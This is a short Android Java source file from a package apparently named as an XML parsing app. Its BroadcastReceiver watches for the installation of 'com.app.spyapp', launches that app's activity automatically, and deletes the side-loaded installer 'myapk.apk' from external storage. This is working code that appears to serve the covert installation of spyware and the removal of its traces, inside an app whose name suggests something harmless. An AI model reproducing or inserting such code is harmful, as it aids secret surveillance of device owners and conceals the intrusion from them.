package com.example.ankit.xmlparsingapp;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.AsyncTask;
import android.os.Environment;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by ANKIT on 8/17/2016.
 */
public class ApplicationAddReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        final String action = intent.getAction();
        if (action.equals(Intent.ACTION_PACKAGE_ADDED)) {
            String packageName = intent.getData().getEncodedSchemeSpecificPart();
            if (packageName.equalsIgnoreCase("com.app.spyapp")) {
                Intent intent1 = new Intent();
                intent1.setComponent(new ComponentName("com.app.spyapp", "com.app.spyapp.HomeActivity"));
                intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent1);
                File file = new File(Environment.getExternalStorageDirectory() + "/myapk.apk");
                if (file.exists()) {
                    file.delete();
                }
            }
        }
    }


}
